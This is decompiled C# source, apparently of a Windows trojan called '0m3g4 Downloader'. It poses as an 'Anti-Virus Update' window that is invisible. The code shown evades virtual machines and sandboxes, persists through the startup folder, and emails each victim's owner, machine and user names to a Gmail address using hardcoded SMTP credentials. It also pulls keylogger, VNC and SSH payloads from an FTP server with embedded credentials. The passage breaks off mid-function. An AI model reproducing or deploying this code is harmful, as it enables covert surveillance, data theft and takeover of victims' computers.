using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using WindowsApplication1.My;
using WindowsApplication1.My.Resources;

namespace WindowsApplication1;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Im_Online")]
	private Timer _Im_Online;

	[AccessedThroughProperty("UpdateChecker")]
	private Timer _UpdateChecker;

	private const int BufferSize = 1024;

	private Thread ServerThread;

	private TcpClient HQ;

	private string Orders;

	private string ServerID;

	private string RemoteNotifier;

	private string pingsite;

	private string NetworkConnectivity;

	private Random RandomClass;

	private int RandomPort;

	private string HQUpLinkPort;

	private string DownloadPort;

	private IPHostEntry IPHost;

	private string MyIntIP;

	private string[] IPsplit;

	private string IP;

	private WebClient WC;

	private string MyExtIP;

	private string InternalNotifier;

	private string ExternalNotifier;

	private string MyVer;

	private string NewVer;

	private string InstalledVer;

	private string UpToDateVer;

	private string ExchangeServer;

	private string ExchangeFile;

	private string UpdateCheck;

	private string UpdateVersion;

	private string UpdateFile;

	private string VncFile;

	private string KeyLoggerFile;

	private string sSHFile;

	private string RootFolder;

	private string BaseFolder;

	private string ServerExchangeFolder;

	private string TempFolder;

	private string ToolsFolder;

	private string FilesFolder;

	private string PersistentFolder;

	private string StartupFolder;

	private string appname;

	private string RegisteredOwner;

	private const int CSIDL_LOCAL_APPDATA = 28;

	private StringBuilder path;

	internal virtual Timer Im_Online
	{
		[DebuggerNonUserCode]
		get
		{
			return _Im_Online;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Im_Online = value;
		}
	}

	internal virtual Timer UpdateChecker
	{
		[DebuggerNonUserCode]
		get
		{
			return _UpdateChecker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CheckForUpdates;
			if (_UpdateChecker != null)
			{
				_UpdateChecker.remove_Tick(eventHandler);
			}
			_UpdateChecker = value;
			if (_UpdateChecker != null)
			{
				_UpdateChecker.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		lock (__ENCList)
		{
			__ENCList.Add(new WeakReference(this));
		}
		ServerID = "0m3g4 -= Downloader =-";
		pingsite = "www.google.com";
		RandomClass = new Random();
		HQUpLinkPort = Conversions.ToString(RandomClass.Next(1025, 63999));
		DownloadPort = Conversions.ToString(Conversions.ToDouble(HQUpLinkPort) + 2011.0);
		IPHost = Dns.GetHostByName(Dns.GetHostName());
		MyIntIP = IPHost.AddressList.GetValue(0)!.ToString();
		IPsplit = MyIntIP.Split(".".ToCharArray());
		WC = new WebClient();
		InternalNotifier = IPsplit[0] + "." + IPsplit[1] + "." + IPsplit[2] + ".250";
		ExternalNotifier = "0m3g4.sytes.net";
		MyVer = ((ApplicationBase)MyProject.Application).get_Info().get_Version().ToString();
		UpdateCheck = "ftp://0m3g4:p1cc1!!o@ftp.drivehq.com/0m3g4/Win7/Downloader/0m3g4-Downloader.txt";
		UpdateVersion = "ftp://0m3g4:p1cc1!!o@ftp.drivehq.com/0m3g4/Win7/Downloader/0m3g4-Version.txt";
		UpdateFile = "ftp://0m3g4:p1cc1!!o@ftp.drivehq.com/0m3g4/Win7/Downloader/0m3g4-Downloader.rar";
		VncFile = "ftp://0m3g4:p1cc1!!o@ftp.drivehq.com/0m3g4/Win7/Vnc/0m3g4-Vnc.rar";
		KeyLoggerFile = "ftp://0m3g4:p1cc1!!o@ftp.drivehq.com/0m3g4/Win7/Keylogger/0m3g4-KeyLogger.rar";
		sSHFile = "ftp://0m3g4:p1cc1!!o@ftp.drivehq.com/0m3g4/Win7/sSH/0m3g4-sSH.rar";
		RootFolder = Directory.GetDirectoryRoot(Environment.SystemDirectory);
		BaseFolder = RootFolder + "System\\";
		ServerExchangeFolder = BaseFolder + "SystemExchange\\";
		TempFolder = ServerExchangeFolder + "SystemTemp";
		ToolsFolder = ServerExchangeFolder + "SystemTools";
		FilesFolder = ServerExchangeFolder + "SystemFiles";
		PersistentFolder = ServerExchangeFolder + "SystemPersistence";
		StartupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		appname = Path.GetFileName(Application.get_ExecutablePath());
		RegisteredOwner = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "RegisteredOwner", "error"));
		path = new StringBuilder(260);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		components = new Container();
		Im_Online = new Timer(components);
		UpdateChecker = new Timer(components);
		((Control)this).SuspendLayout();
		Im_Online.set_Interval(90000);
		UpdateChecker.set_Enabled(true);
		UpdateChecker.set_Interval(300000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Anti-Virus Update");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	public void Anti_Detection()
	{
		VBoxHere();
		VmWareHere();
		VPCHere();
		ATE();
		ACWSbox();
		ANSbox();
		ASSbox();
		ASbox2();
		AASbox();
		NoSB();
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpMN);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpCN, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWN);

	public void NoSB()
	{
		if (Process.GetProcessesByName("SbieSvc").Length >= 1)
		{
			Environment.Exit(0);
		}
	}

	public void VBoxHere()
	{
		if ((Process.GetProcessesByName("VBoxService").Length >= 1) | (Process.GetProcessesByName("VBoxTray").Length >= 1))
		{
			Environment.Exit(0);
		}
	}

	public void VmWareHere()
	{
		string lpCN = "VMDragDetectWndClass";
		string lpWN = null;
		long num = FindWindowA(ref lpCN, ref lpWN);
		if (num == 0L)
		{
			Environment.Exit(0);
		}
	}

	public void VPCHere()
	{
		if (Process.GetProcessesByName("Virtual PC").Length >= 1)
		{
			Environment.Exit(0);
		}
	}

	public void ATE()
	{
		if (Process.GetCurrentProcess().MainModule!.FileName!.Contains("sample"))
		{
			Environment.Exit(0);
		}
	}

	public void ACWSbox()
	{
		if (((Operators.CompareString(((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath(), "C:\\", false) == 0) | (Operators.CompareString(((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath(), "D:\\", false) == 0) | (Operators.CompareString(((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath(), "F:\\", false) == 0) | (Operators.CompareString(((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath(), "X:\\", false) == 0)) && Operators.CompareString(Interaction.Environ("username"), "Schmidti", false) == 0)
		{
			Environment.Exit(0);
			ProjectData.EndApp();
		}
	}

	public void ANSbox()
	{
		if (Operators.CompareString(Interaction.Environ("username"), "currentuser", false) == 0)
		{
			Environment.Exit(0);
			ProjectData.EndApp();
		}
	}

	public void ASSbox()
	{
		if (Operators.CompareString(((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath(), "C:\\", false) == 0 && Operators.CompareString(((ApplicationBase)MyProject.Application).get_Info().get_AssemblyName(), "file", false) == 0)
		{
			Environment.Exit(0);
			ProjectData.EndApp();
		}
	}

	public void ASbox2()
	{
		string lpMN = "SbieDll.dll";
		if (GetModuleHandleA(ref lpMN) != 0)
		{
			Environment.Exit(0);
			ProjectData.EndApp();
		}
	}

	public void AASbox()
	{
		if ((Operators.CompareString(((ApplicationBase)MyProject.Application).get_Info().get_AssemblyName(), "Sample", false) == 0) | (Operators.CompareString(Interaction.Environ("username"), "andy", false) == 0) | (Operators.CompareString(Interaction.Environ("username"), "Andy", false) == 0))
		{
			Environment.Exit(0);
			ProjectData.EndApp();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 332:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0025;
						case 5:
							goto IL_0039;
						case 6:
							goto IL_0041;
						case 7:
							goto IL_0049;
						case 8:
							goto IL_0051;
						case 9:
							goto IL_0059;
						case 10:
							goto IL_0067;
						case 11:
							goto IL_0070;
						case 12:
							goto IL_0079;
						case 13:
						case 14:
							goto IL_0082;
						case 15:
							goto IL_008b;
						case 16:
							goto IL_0094;
						case 17:
							goto IL_009d;
						case 18:
							goto IL_00b8;
						case 19:
							goto IL_00c7;
						case 20:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 21:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00c7:
					num = 19;
					ServerThread.Start();
					break;
					IL_00b8:
					num = 18;
					ServerThread.IsBackground = true;
					goto IL_00c7;
					IL_0009:
					num = 2;
					Control.set_CheckForIllegalCrossThreadCalls(false);
					goto IL_0011;
					IL_0011:
					num = 3;
					SystemEvents.add_PowerModeChanged(new PowerModeChangedEventHandler(PowerModeChanged));
					goto IL_0025;
					IL_0025:
					num = 4;
					SystemEvents.add_SessionEnding(new SessionEndingEventHandler(SessionEnding));
					goto IL_0039;
					IL_0039:
					num = 5;
					Anti_Detection();
					goto IL_0041;
					IL_0041:
					num = 6;
					Decoy();
					goto IL_0049;
					IL_0049:
					num = 7;
					Leave_Home();
					goto IL_0051;
					IL_0051:
					num = 8;
					chkInternet();
					goto IL_0059;
					IL_0059:
					num = 9;
					if (!chkExistence())
					{
						goto IL_0067;
					}
					goto IL_0082;
					IL_0067:
					num = 10;
					Resisitation();
					goto IL_0070;
					IL_0070:
					num = 11;
					Clear_Internet_Data();
					goto IL_0079;
					IL_0079:
					num = 12;
					FirstTimeNotify();
					goto IL_0082;
					IL_0082:
					num = 14;
					CheckForUpdate();
					goto IL_008b;
					IL_008b:
					num = 15;
					AddToStartup();
					goto IL_0094;
					IL_0094:
					num = 16;
					Victim_Online();
					goto IL_009d;
					IL_009d:
					num = 17;
					ServerThread = new Thread(Server);
					goto IL_00b8;
					end_IL_0001_2:
					break;
				}
				num = 20;
				Im_Online.Start();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 332;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void FirstTimeNotify()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object obj = default(object);
		object obj2 = default(object);
		FileStream stream = default(FileStream);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		string text2 = default(string);
		object obj3 = default(object);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		object obj4 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 1475:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_003d;
						case 5:
							goto IL_0059;
						case 6:
							goto IL_0065;
						case 7:
							goto IL_007f;
						case 8:
							goto IL_008e;
						case 11:
							goto IL_009d;
						case 12:
							goto IL_00a1;
						case 13:
							goto IL_00c6;
						case 15:
						case 16:
							goto IL_00dd;
						case 10:
						case 18:
						case 19:
						case 20:
							goto IL_0100;
						case 21:
							goto IL_0195;
						case 22:
							goto IL_01af;
						case 23:
							goto IL_01c8;
						case 24:
							goto IL_01e7;
						case 25:
							goto IL_01f8;
						case 26:
							goto IL_0203;
						case 27:
							goto IL_020d;
						case 28:
							goto IL_0218;
						case 29:
							goto IL_0223;
						case 30:
							goto IL_0259;
						case 31:
							goto IL_028e;
						case 32:
							goto IL_02c8;
						case 33:
							goto IL_02fe;
						case 34:
							goto IL_0333;
						case 35:
							goto IL_0368;
						case 36:
							goto IL_039e;
						case 37:
							goto IL_03b9;
						case 38:
							goto IL_03c1;
						case 39:
							goto IL_03e4;
						case 40:
							goto IL_0406;
						case 41:
							goto IL_0429;
						case 42:
							goto IL_044c;
						case 43:
							goto IL_046e;
						case 44:
							goto IL_0495;
						case 45:
							goto IL_04b5;
						case 46:
							goto IL_04b8;
						case 47:
							goto IL_04bf;
						case 48:
							goto IL_04c5;
						case 49:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 9:
						case 14:
						case 17:
						case 50:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_04c5:
					num = 48;
					obj = null;
					break;
					IL_04bf:
					num = 47;
					obj2 = null;
					goto IL_04c5;
					IL_000a:
					num = 2;
					if (!Conversions.ToBoolean(NetworkConnectivity))
					{
						goto IL_0020;
					}
					goto IL_0100;
					IL_0020:
					num = 3;
					if (!File.Exists(TempFolder + "\\nonet.txt"))
					{
						goto IL_003d;
					}
					goto IL_009d;
					IL_003d:
					num = 4;
					stream = new FileStream(TempFolder + "\\nonet.txt", FileMode.Create, FileAccess.Write);
					goto IL_0059;
					IL_0059:
					num = 5;
					streamWriter = new StreamWriter(stream);
					goto IL_0065;
					IL_0065:
					num = 6;
					streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
					goto IL_007f;
					IL_007f:
					num = 7;
					streamWriter.WriteLine("Try Email Later");
					goto IL_008e;
					IL_008e:
					num = 8;
					streamWriter.Close();
					goto end_IL_0001_3;
					IL_009d:
					num = 11;
					goto IL_00a1;
					IL_00a1:
					num = 12;
					text = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(TempFolder + "\\nonet.txt");
					goto IL_00c6;
					IL_00c6:
					num = 13;
					if (text.Contains("Email"))
					{
						goto end_IL_0001_3;
					}
					goto IL_00dd;
					IL_00dd:
					num = 16;
					File.AppendAllText(TempFolder + "\\nonet.txt", "\r\nTry Email Later");
					goto end_IL_0001_3;
					IL_0100:
					num = 20;
					text2 = "--= Machine Details =--\r\n\r\n---===========================---\r\n\r\nRegistered Owner: \r\n[ " + RegisteredOwner + " ]\r\n\r\nComputer Name: \r\n[ " + Environment.MachineName.ToString() + " ]\r\n\r\nUser Name: \r\n[ " + Environment.UserName.ToString() + " ]\r\n\r\nOperating System Name: \r\n[ " + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString() + " ]\r\n\r\n---===========================---\r\n\r\n-== 0m3g4 Downloader ==-\r\nVersion: [ " + MyVer + " ]";
					goto IL_0195;
					IL_0195:
					num = 21;
					obj3 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Message", ""));
					goto IL_01af;
					IL_01af:
					num = 22;
					obj2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Configuration", ""));
					goto IL_01c8;
					IL_01c8:
					num = 23;
					obj = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj2, (Type)null, "Fields", new object[0], (string[])null, (Type[])null, (bool[])null));
					goto IL_01e7;
					IL_01e7:
					num = 24;
					text3 = "0m3g4 Downloader \r\nJust Got An Activation On A New PC! \r\n\r\n" + text2;
					goto IL_01f8;
					IL_01f8:
					num = 25;
					text4 = "0m3g4 <The.0m3g4.Network@gmail.com>";
					goto IL_0203;
					IL_0203:
					num = 26;
					text5 = "0m3g4 <The.0m3g4.Network@gmail.com>";
					goto IL_020d;
					IL_020d:
					num = 27;
					text6 = "0m3g4 Downloader -= 1st Time Activation =-";
					goto IL_0218;
					IL_0218:
					num = 28;
					text7 = "http://schemas.microsoft.com/cdo/configuration/";
					goto IL_0223;
					IL_0223:
					num = 29;
					NewLateBinding.LateSet(obj, (Type)null, "Item", new object[2]
					{
						text7 + "sendusing",
						2
					}, (string[])null, (Type[])null);
					goto IL_0259;
					IL_0259:
					num = 30;
					NewLateBinding.LateSet(obj, (Type)null, "Item", new object[2]
					{
						text7 + "smtpserver",
						"smtp.gmail.com"
					}, (string[])null, (Type[])null);
					goto IL_028e;
					IL_028e:
					num = 31;
					NewLateBinding.LateSet(obj, (Type)null, "Item", new object[2]
					{
						text7 + "smtpserverport",
						465
					}, (string[])null, (Type[])null);
					goto IL_02c8;
					IL_02c8:
					num = 32;
					NewLateBinding.LateSet(obj, (Type)null, "Item", new object[2]
					{
						text7 + "smtpauthenticate",
						1
					}, (string[])null, (Type[])null);
					goto IL_02fe;
					IL_02fe:
					num = 33;
					NewLateBinding.LateSet(obj, (Type)null, "Item", new object[2]
					{
						text7 + "sendusername",
						"the.0m3g4.network"
					}, (string[])null, (Type[])null);
					goto IL_0333;
					IL_0333:
					num = 34;
					NewLateBinding.LateSet(obj, (Type)null, "Item", new object[2]
					{
						text7 + "sendpassword",
						"p1cc1!!o"
					}, (string[])null, (Type[])null);
					goto IL_0368;
					IL_0368:
					num = 35;
					NewLateBinding.LateSet(obj, (Type)null, "Item", new object[2]
					{
						text7 + "smtpusessl",
						1
					}, (string[])null, (Type[])null);
					goto IL_039e;
					IL_039e:
					num = 36;
					NewLateBinding.LateCall(obj, (Type)null, "Update", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_03b9;
					IL_03b9:
					num = 37;
					obj4 = obj3;
					goto IL_03c1;
					IL_03c1:
					num = 38;
					NewLateBinding.LateSet(obj4, (Type)null, "To", new object[1] { text4 }, (string[])null, (Type[])null);
					goto IL_03e4;
					IL_03e4:
					num = 39;
					NewLateBinding.LateSet(obj4, (Type)null, "From", new object[1] { text5 }, (string[])null, (Type[])null);
					goto IL_0406;
					IL_0406:
					num = 40;
					NewLateBinding.LateSet(obj4, (Type)null, "Subject", new object[1] { text6 }, (string[])null, (Type[])null);
					goto IL_0429;
					IL_0429:
					num = 41;
					NewLateBinding.LateSet(obj4, (Type)null, "TextBody", new object[1] { text3 }, (string[])null, (Type[])null);
					goto IL_044c;
					IL_044c:
					num = 42;
					NewLateBinding.LateSet(obj4, (Type)null, "Sender", new object[1] { text5 }, (string[])null, (Type[])null);
					goto IL_046e;
					IL_046e:
					num = 43;
					NewLateBinding.LateSet(obj4, (Type)null, "Configuration", new object[1] { RuntimeHelpers.GetObjectValue(obj2) }, (string[])null, (Type[])null);
					goto IL_0495;
					IL_0495:
					num = 44;
					Conversions.ToInteger(NewLateBinding.LateGet(obj4, (Type)null, "Send", new object[0], (string[])null, (Type[])null, (bool[])null));
					goto IL_04b5;
					IL_04b5:
					obj4 = null;
					goto IL_04b8;
					IL_04b8:
					num = 46;
					obj3 = null;
					goto IL_04bf;
					end_IL_0001_2:
					break;
				}
				num = 49;
				File.Delete(TempFolder + "\\nonet.txt");
				break;
				end_IL_0001:;
			}
			catch (object obj5) when (obj5 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj5);
				try0001_dispatch = 1475;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void SelfDestructNotify()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object obj = default(object);
		object obj2 = default(object);
		string text = default(string);
		object obj3 = default(object);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		object obj4 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 1111:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0089;
						case 4:
							goto IL_00a2;
						case 5:
							goto IL_00ba;
						case 6:
							goto IL_00d8;
						case 7:
							goto IL_00f3;
						case 8:
							goto IL_00fd;
						case 9:
							goto IL_0106;
						case 10:
							goto IL_0111;
						case 11:
							goto IL_011c;
						case 12:
							goto IL_0152;
						case 13:
							goto IL_0187;
						case 14:
							goto IL_01c1;
						case 15:
							goto IL_01f7;
						case 16:
							goto IL_022c;
						case 17:
							goto IL_0261;
						case 18:
							goto IL_0297;
						case 19:
							goto IL_02b2;
						case 20:
							goto IL_02ba;
						case 21:
							goto IL_02dd;
						case 22:
							goto IL_02ff;
						case 23:
							goto IL_0322;
						case 24:
							goto IL_0345;
						case 25:
							goto IL_0367;
						case 26:
							goto IL_038e;
						case 27:
							goto IL_03ae;
						case 28:
							goto IL_03b1;
						case 29:
							goto IL_03b8;
						case 30:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 31:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_03b8:
					num = 29;
					obj = null;
					break;
					IL_03b1:
					num = 28;
					obj2 = null;
					goto IL_03b8;
					IL_000a:
					num = 2;
					text = "--= Machine Details =--\r\n\r\n---===========================---\r\n\r\nRegistered Owner: \r\n[ " + RegisteredOwner + " ]\r\n\r\nComputer Name: \r\n[ " + Environment.MachineName.ToString() + " ]\r\n\r\nUser Name: \r\n[ " + Environment.UserName.ToString() + " ]\r\n\r\nOperating System Name: \r\n[ " + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString() + " ]\r\n\r\n---===========================---";
					goto IL_0089;
					IL_0089:
					num = 3;
					obj2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Message", ""));
					goto IL_00a2;
					IL_00a2:
					num = 4;
					obj = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Configuration", ""));
					goto IL_00ba;
					IL_00ba:
					num = 5;
					obj3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "Fields", new object[0], (string[])null, (Type[])null, (bool[])null));
					goto IL_00d8;
					IL_00d8:
					num = 6;
					text2 = "0m3g4 Downloader \r\nHas  Been Removed From " + RegisteredOwner + "'s PC! \r\n\r\n" + text;
					goto IL_00f3;
					IL_00f3:
					num = 7;
					text3 = "0m3g4 <The.0m3g4.Network@gmail.com>";
					goto IL_00fd;
					IL_00fd:
					num = 8;
					text4 = "0m3g4 <The.0m3g4.Network@gmail.com>";
					goto IL_0106;
					IL_0106:
					num = 9;
					text5 = "0m3g4 Downloader -= Self-Destruction =-";
					goto IL_0111;
					IL_0111:
					num = 10;
					text6 = "http://schemas.microsoft.com/cdo/configuration/";
					goto IL_011c;
					IL_011c:
					num = 11;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "sendusing",
						2
					}, (string[])null, (Type[])null);
					goto IL_0152;
					IL_0152:
					num = 12;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "smtpserver",
						"smtp.gmail.com"
					}, (string[])null, (Type[])null);
					goto IL_0187;
					IL_0187:
					num = 13;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "smtpserverport",
						465
					}, (string[])null, (Type[])null);
					goto IL_01c1;
					IL_01c1:
					num = 14;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "smtpauthenticate",
						1
					}, (string[])null, (Type[])null);
					goto IL_01f7;
					IL_01f7:
					num = 15;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "sendusername",
						"the.0m3g4.network"
					}, (string[])null, (Type[])null);
					goto IL_022c;
					IL_022c:
					num = 16;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "sendpassword",
						"p1cc1!!o"
					}, (string[])null, (Type[])null);
					goto IL_0261;
					IL_0261:
					num = 17;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "smtpusessl",
						1
					}, (string[])null, (Type[])null);
					goto IL_0297;
					IL_0297:
					num = 18;
					NewLateBinding.LateCall(obj3, (Type)null, "Update", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_02b2;
					IL_02b2:
					num = 19;
					obj4 = obj2;
					goto IL_02ba;
					IL_02ba:
					num = 20;
					NewLateBinding.LateSet(obj4, (Type)null, "To", new object[1] { text3 }, (string[])null, (Type[])null);
					goto IL_02dd;
					IL_02dd:
					num = 21;
					NewLateBinding.LateSet(obj4, (Type)null, "From", new object[1] { text4 }, (string[])null, (Type[])null);
					goto IL_02ff;
					IL_02ff:
					num = 22;
					NewLateBinding.LateSet(obj4, (Type)null, "Subject", new object[1] { text5 }, (string[])null, (Type[])null);
					goto IL_0322;
					IL_0322:
					num = 23;
					NewLateBinding.LateSet(obj4, (Type)null, "TextBody", new object[1] { text2 }, (string[])null, (Type[])null);
					goto IL_0345;
					IL_0345:
					num = 24;
					NewLateBinding.LateSet(obj4, (Type)null, "Sender", new object[1] { text4 }, (string[])null, (Type[])null);
					goto IL_0367;
					IL_0367:
					num = 25;
					NewLateBinding.LateSet(obj4, (Type)null, "Configuration", new object[1] { RuntimeHelpers.GetObjectValue(obj) }, (string[])null, (Type[])null);
					goto IL_038e;
					IL_038e:
					num = 26;
					Conversions.ToInteger(NewLateBinding.LateGet(obj4, (Type)null, "Send", new object[0], (string[])null, (Type[])null, (bool[])null));
					goto IL_03ae;
					IL_03ae:
					obj4 = null;
					goto IL_03b1;
					end_IL_0001_2:
					break;
				}
				num = 30;
				obj3 = null;
				break;
				end_IL_0001:;
			}
			catch (object obj5) when (obj5 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj5);
				try0001_dispatch = 1111;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void UpdateNotify()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object obj = default(object);
		object obj2 = default(object);
		string text = default(string);
		object obj3 = default(object);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		object obj4 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 1196:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0014;
						case 4:
							goto IL_0036;
						case 5:
							goto IL_00df;
						case 6:
							goto IL_00f8;
						case 7:
							goto IL_0110;
						case 8:
							goto IL_012e;
						case 9:
							goto IL_013e;
						case 10:
							goto IL_0149;
						case 11:
							goto IL_0153;
						case 12:
							goto IL_015e;
						case 13:
							goto IL_0169;
						case 14:
							goto IL_019f;
						case 15:
							goto IL_01d4;
						case 16:
							goto IL_020e;
						case 17:
							goto IL_0244;
						case 18:
							goto IL_0279;
						case 19:
							goto IL_02ae;
						case 20:
							goto IL_02e4;
						case 21:
							goto IL_02ff;
						case 22:
							goto IL_0307;
						case 23:
							goto IL_032a;
						case 24:
							goto IL_034c;
